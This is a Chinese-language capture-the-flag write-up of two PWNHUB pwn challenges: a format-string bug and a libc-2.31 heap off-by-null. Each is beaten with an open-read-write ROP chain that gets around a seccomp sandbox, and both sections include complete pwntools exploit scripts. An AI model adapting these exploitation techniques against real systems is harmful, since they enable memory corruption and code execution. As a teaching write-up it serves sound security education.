> 原文链接: https://www.anquanke.com//post/id/227185 


# PWNHUB双蛋赛pwn题解


                                阅读量   
                                **131385**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p1.ssl.qhimg.com/t0163ff028708829c41.jpg)](https://p1.ssl.qhimg.com/t0163ff028708829c41.jpg)



pwnhub的2道pwn题目，一道格式化字符串的题目，一道libc-2.31的堆题目。题目的逆向量都不大，程序分析起来比较容易，更关注的是利用的手法。下面直接进入正题。

## 公开赛题目

### <a class="reference-link" name="0x00%20%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90&amp;&amp;%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"></a>0x00 程序分析&amp;&amp;漏洞分析

一打开就看到了挺烦人的prctl的函数，进行了沙箱设置，使用seccomp工具进行分析

```
//seccomp-tools dump ./easypwn
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x05 0xc000003e  if (A != ARCH_X86_64) goto 0007
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005
 0004: 0x15 0x00 0x02 0xffffffff  if (A != 0xffffffff) goto 0007
 0005: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0007
 0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0007: 0x06 0x00 0x00 0x00000000  return KILL
```

可以看到禁用了execve函数，需要使用orw来读取flag<br>
程序漏洞点很明确，格式化字符串的漏洞，关键代码如下：

```
read(0, &amp;buf, 0x18uLL);//读取0x18的字符串到stack的buf上
strcpy((char *)&amp;unk_202060 + 0x24 * (signed int)a1, (const char *)&amp;buf);//复制到bss段上
printf((const char *)&amp;unk_202060 + 0x24 * (signed int)a1, &amp;buf);//格式化字符串漏洞
```

可以发现，虽然看起来是bss段上的格式化字符串漏洞，但是，首先在stack上写入了数据，所以说，就和正常的stack上的格式化字符串一样，可以任意读写，需要注意的是size=0x18，这个是比较受限的。

有了任意读写，我们可以获取到libc、pie、satck的值，但是由于沙箱规则的限制，需要写入大量的值，需要反复触发格式化字符串的漏洞，但是，如下所示，程序只给了我们2次触发机会。

```
signed int i;
for ( i = 0; i &lt;= 1; ++i )                    
    vuln(i);
```

然后关键的问题就落到如何构造循环上来了。<br>
这里的思路如下：

```
//stack上的返回地址
.text:0000000000000D4D                 add     [rbp+var_8], 1
//修改为
.text:0000000000000D3A                 mov     [rbp+var_8], 0
```

这样的话，每第二次循环我们作如上的修改，就可以做到循环，每两次获得一次任意读写的机会。

### <a class="reference-link" name="0x01%20exploit"></a>0x01 exploit

经过上述的分析，利用思路已经相对清晰了，基本的利用步骤如下：
1. 第一次触发格式化字符串漏洞来泄漏stack、pie&amp;&amp;libc的相关信息
<li>第二次修改返回地址0x4d为0x3a，将i的值再次置0
<pre><code class="hljs cs">.text:0000000000000D4D                 add     [rbp+var_8], 1
//stack上的返回地址修改为
.text:0000000000000D3A                 mov     [rbp+var_8], 0
</code></pre>
依此类推，获得多次的任意写。
</li>
1. 在bss上写入orw的rop。
1. 最后进行栈迁移执行rop，得到flag。
具体的细节可以参考下面的exp脚本。

### <a class="reference-link" name="0x02%20myexp"></a>0x02 myexp

具体的exp脚本如下，写起来还是挺繁琐的。

```
from pwn import *
context.log_level = 'debug'


def debug():
    print pidof(p)
    pause()

def write(addr,val):
    value = str(val).rjust(6,'0')
    #offset = str(offset).rjust(4,'0')
    if val == 0:
        name = '%' + '0010' + '$hn'+'a'*8 + p64(addr)
    else:
        name = '%' + value + 'c' + '%' + '0010' + '$hn' + p64(addr)
    p.sendafter('name?',name)
    p.sendlineafter("how old are you??",str(100))

    #in order to the next loop
    name='%'+str(0x3a)+"c"+"%10$hhnaaaaa"+p64(stack-0x18)
    p.sendafter('name?',name)
    p.sendlineafter("how old are you??",str(100))

def write_addr(offset,val):
    write(pie+0x202500+offset,val&amp;0xffff)
    write(pie+0x202500+offset+2,(val&gt;&gt;16)&amp;0xffff)
    write(pie+0x202500+offset+4,(val&gt;&gt;32)&amp;0xffff)

def write_stack_addr(offset,val):
    write(stack+offset,val&amp;0xffff)
    write(stack+offset+2,(val&gt;&gt;16)&amp;0xffff)
    write(stack+offset+4,(val&gt;&gt;32)&amp;0xffff)

#p=process('./easypwn')
p=remote('139.217.102.146',33865)
debug()
#leak stak libc &amp;&amp; pie
#test 0x7ffe4279d630 0x7fcf97582840 
p.sendafter('name?','%19$p%14$p%18$p')
p.recvuntil('0x')
libcbase=int(p.recv(12),16)-0x20840
log.success("libc --&gt;"+hex(libcbase))

p.recvuntil('0x')
stack=int(p.recv(12),16)
log.success("stack --&gt;"+hex(stack))

p.recvuntil('0x')
pie=int(p.recv(12),16)-0xd70
log.success("pie --&gt;"+hex(pie))
p.sendlineafter("how old are you??",str(100))
debug()
## make loop \x00  -- is iok
name='%'+str(0x3a)+"c"+"%10$hhnaaaaa"+p64(stack-0x18)
p.sendafter('name?',name)
p.sendlineafter("how old are you??",str(100))

pop_rdi=0x0000000000021112+libcbase
pop_rsi=0x00000000000202f8+libcbase
pop_rdx=0x0000000000001b92+libcbase
open_addr = 0xf70f0 + libcbase
read_addr = 0xf7310 + libcbase
puts_addr = 0x6f6a0 + libcbase
leave_ret_addr = 0x0000000000042361 + libcbase
#log.success("pop_rdi is " + hex(pop_rdi))
#write(stack+8,pop_rdi&amp;0xffff)
#write(stack+8+2,(pop_rdi&gt;&gt;16)&amp;0xffff)
#write(stack+8+2+2,(pop_rdi&gt;&gt;32)&amp;0xffff)
write_addr(8,pop_rdi)
write_addr(0x10,pie+0x202060)#./flag
write_addr(0x18,pop_rsi)
#write_addr(0x20,0)
write_addr(0x28,open_addr)

write_addr(0x30,pop_rdi)
write_addr(0x38,3)
write_addr(0x40,pop_rsi)
write_addr(0x48,pie+0x202060)
write_addr(0x50,pop_rdx)
write_addr(0x58,0x50)#once
write_addr(0x60,read_addr)

write_addr(0x68,pop_rdi)
write_addr(0x70,pie+0x202060)
write_addr(0x78,puts_addr)

write_stack_addr(0,pie+0x202500)
write_stack_addr(8,leave_ret_addr)

p.sendafter('name?','./flag\x00')
p.sendlineafter("how old are you??",str(100))

p.sendafter('name?','./flag\x00')
p.sendlineafter("how old are you??",str(100))

debug()
p.interactive()
//flag`{`48e13dc24d00405599522395a6160972`}`
```

最终拿到flag

[![](https://p1.ssl.qhimg.com/t01d699f7a05201f3da.png)](https://p1.ssl.qhimg.com/t01d699f7a05201f3da.png)



## 内部赛题目

### <a class="reference-link" name="0x00%20%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90&amp;&amp;%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"></a>0x00 程序分析&amp;&amp;漏洞分析

同样的也设置了沙箱规则，禁用了execve，同样的需要orw来读取flag

```
line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x07 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0011
 0004: 0x15 0x06 0x00 0x00000029  if (A == socket) goto 0011
 0005: 0x15 0x05 0x00 0x0000002a  if (A == connect) goto 0011
 0006: 0x15 0x04 0x00 0x00000031  if (A == bind) goto 0011
 0007: 0x15 0x03 0x00 0x00000032  if (A == listen) goto 0011
 0008: 0x15 0x02 0x00 0x00000038  if (A == clone) goto 0011
 0009: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0011
 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0011: 0x06 0x00 0x00 0x00000000  return KILL
```

经典的堆菜单题目，下面对程序的基本功能进行简单的分析：
- add：添加一个堆块，要求size&lt;=0x200，最大数量为20个，可以读入size大小的数据，add功能的限制相对比较宽松。
- exit：执行exit函数退出
- delete：这里又提供了2种选择，show和edit
这里以edit为例进行简单的分析，show和edit是完全一致的：

```
_free_hook = (__int64)edit;//首先是对__free_hook的值进行设置
//edit函数
void __fastcall edit(char *a1)
`{`
  int v1; // [rsp-Ch] [rbp-Ch]

  __asm `{` endbr64 `}`
  _free_hook = 0LL;
  v1 = *(a1 - 8) - 9;                           
  printf("Info:");
  if ( v1 &gt; 1 )                                 // check
  `{`
    read(0, a1, v1 - 1);
    a1[v1] = 0;                                 // off by null
  `}`
  free(a1);
`}`
```

大致的逻辑就是设置__free_hook为edit或者show函数，先执行edit、show函数然后再free

```
ptr[v2] = 0LL;
size_[v2] = 0LL;
```

指针和size都做了清0的处理，不存在uaf的问题。<br>
该题目的漏洞点在于上述的edit功能中。试想一下，有个大小为0x20的chunk，如果前一个堆块不是free状态，那么他的size=0x21，v1=0x21-9=0x18，写入大小0x18的数据，然后a1[0x18]=0，这里就出现了问题，off by null的漏洞。

### <a class="reference-link" name="0x01%20exploit"></a>0x01 exploit

现在整理一下思路，首先考虑泄漏地址的问题。通过数据信息的残留，可以比较轻易的获得libcbase和heap addr。那么，最关键的问题就是libc-2.31下的off by null的利用以及orw绕过沙箱机制。

#### <a class="reference-link" name="off%20by%20null%E7%9A%84%E5%88%A9%E7%94%A8"></a>off by null的利用

这里，已经有很多师傅对libc-2.31的增添的保护机制进行了深入的分析，主要是添加了presize和size的check，如果大小不一致的话，就会报错。这就使得之前版本的利用思路失效了。

这里，采用了如下的绕过思路：在chunk中伪造一个chunk，主要是伪造size、fd、bk的值，size写成presize，而fd=bk写成伪造的chunk的heap addr，如下图所示

```
pwndbg&gt; x/20xg 0x55c1a0806140
0x55c1a0806140:    0x6161616161616161    0x0000000000000151
0x55c1a0806150:    0x0000000000000000    0x0000000000000371//fake chunk
0x55c1a0806160:    0x000055c1a0806150    0x000055c1a0806150
0x55c1a0806170:    0x6161616161616161    0x6161616161616161
0x55c1a0806180:    0x6161616161616161    0x6161616161616161
```

然后就可以正常写入presize并触发off by null的漏洞，然后free堆块，就构成chunk overlap。

#### <a class="reference-link" name="orw%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87"></a>orw沙箱绕过

目前我已知的libc-2.31的orw沙箱绕过思路有2种，有其他思路的师傅也欢迎交流。

一种是借助free_hook，写入一个ropgaget，将rdi转换成rdx，然后借助set_context函数来实现。就本题来说，无法利用free_hook，这里的free_hook是在bss段上的，而我们无法泄漏地址。

这里我们使用另一种利用方式，malloc_hook+io劫持来实现orw的执行。这里，推荐一篇其他师傅的分析文章，写的很详细：<br>[link](https://gist.github.com/Mech0n/43bb087bfe0fbe9f80dbccb815f5cab3)<br>
主要的利用链是这样的：

```
exit函数触发--&gt;_IO_cleanup()--&gt;_IO_flush_all_lockp()--&gt;_IO_str_overflow
//触发__malloc_hook
在_IO_str_overflow (FILE *fp, int c)种会调用 new_buf = malloc (new_size);
//rdi--&gt;rdx，方便后面set_context的利用，这里的rdi就是stdin(fp)
0x7ffff7e62b65 &lt;__GI__IO_str_overflow+53&gt;:   mov    rdx,QWORD PTR [rdi+0x28]
```

这一部分的关键payload如下，需要绕过那些关键check都在下面做了相关注释：

```
payload = b'\x00'*0x28#把flag处的值设置为\x00,绕过代码中的很多check
#fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)
payload += p64(stdin + 0xe0)#_IO_write_ptr &amp;&amp; rdi+0x28--&gt;rdx 
payload = payload.ljust(0xd8,b'\x00')
payload += p64(libcbase + 0x1ed560)#_IO_str_jumps 为了执行的是_IO_str_overflow
payload += orw
payload = payload.ljust(0x1f0,b'\x00')
payload += p64(libcbase+0x0000000000580DD)#malloc_hook--&gt;set_context
```

### <a class="reference-link" name="0x02%20myexp"></a>0x02 myexp

具体的exp如下所示：

```
from pwn import *
context.log_level='debug'

def debug():
    print(pidof(p))
    pause()

def choice(i):
    p.sendlineafter('choice:',str(i))

def add(n,s):
    choice(1)
    p.sendlineafter('Size of info:',str(n))#n&lt;=0x200
    p.sendafter('Info:',s)

def show(i):
    choice(2)
    p.sendlineafter('index:',str(i))
    choice(2)

def edit(i,s):
    choice(2)
    p.sendlineafter('index:',str(i))
    choice(1)
    p.sendafter('Info:',s)

#libc.so is correct
#p=remote('139.217.102.146',65386)
p=process('./pwn')
libc=ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so')
for i in range(0x8):
    add(0x1f0,b'a'*0x1f0)
add(0x60+0x1a0,b'a'*0x60)#index=8 size=0x70
add(0x10,b'a'*0x10)#index=9 size=0x20
add(0x1f0,b'a'*0x1f0)#index=10 size=0x210
add(0x1f0,b'a'*0x1e0 + b'./flag\x00')#index=11 size=0x210
add(0x200,b'a'*0x200)#index=12

#leak heap address
show(0)
show(1)
add(0x1f0,b'a')
show(0)
p.recvuntil('a')
heap=u64((b'\x00'+p.recv(5)).ljust(8,b'\x00'))-(0x0000563c8e9c1200-0x563c8e9c1000)
log.success('heap address--&gt;'+ hex(heap))
#debug()

#leak libcbase
for i in range(2,0x8):
    show(i)
#add(0xe0,b'a'*8)
add(0xa0,b'a'*8)
show(0)
p.recvuntil(b'a'*8)
libcbase=u64(p.recv(6).ljust(8,b'\x00'))-(0x00007fd0cccfbdd0-0x7fd0ccb10000)
#off by null 
#only rest index=8,9,10,11
#0x100--&gt;0x150 0x150+0xb0=0x200
add(0x140,p64(0)+p64(0x191+0x40+0x1a0)+p64(heap+(0x5609760e2190-0x5609760e1000-0x40))+p64(heap+(0x5609760e2190-0x5609760e1000-0x40)))#0
debug()
edit(9,b'a'*0x10+p64(0x190+0x40+0x1a0))
show(10)#get overlap

#orw 
stdin = libcbase + (0x7f277caba980-0x7f277c8cf000)
ret=0x0000000000025679+libcbase
pop_rdi=libcbase+0x0000000000026b72
pop_rsi=libcbase+0x0000000000027529
pop_rdx_rbx=libcbase+0x0000000000162866
flag = heap + 0x565150050530 + 0x1e0 - 0x56515004f000 + 0x1a0
orw = p64(pop_rdi)+p64(flag)+p64(pop_rsi)+p64(0)+p64(libc.symbols['open']+libcbase)
orw += p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(flag)+p64(pop_rdx_rbx)+p64(0x50)+p64(0)+p64(libc.symbols['read']+libcbase)
orw += p64(pop_rdi)+p64(flag)+p64(libc.symbols['puts']+libcbase)
if len(orw) &gt; 0xa0:
    print("orw too long ")
    pause()
orw = orw.ljust(0xa0,b'\x00')
orw += p64(stdin + 0xe0) + p64(ret)

#stdin = libcbase + (0x7f277caba980-0x7f277c8cf000)
payload = b'\x00'*0x28
payload += p64(stdin + 0xe0)#_IO_write_ptr &amp;&amp; rdi+0x28--&gt;rdx
payload = payload.ljust(0xd8,b'\x00')
payload += p64(libcbase + 0x1ed560)#_IO_str_jumps
payload += orw
payload = payload.ljust(0x1f0,b'\x00')
payload += p64(libcbase+0x0000000000580DD)#malloc_hook--&gt;set_context

show(12)
show(8)
add(0x130,b'a')
add(0x50,p64(stdin))#fd--&gt;stdin
add(0x200,b'a')
add(0x200,payload)
debug()
p.interactive()
```

然后拿到flag

[![](https://p5.ssl.qhimg.com/t0121a0a714f80de955.png)](https://p5.ssl.qhimg.com/t0121a0a714f80de955.png)

最后，如果文中有什么错误请各位师傅指出；如果有更好的思路欢迎交流分享。
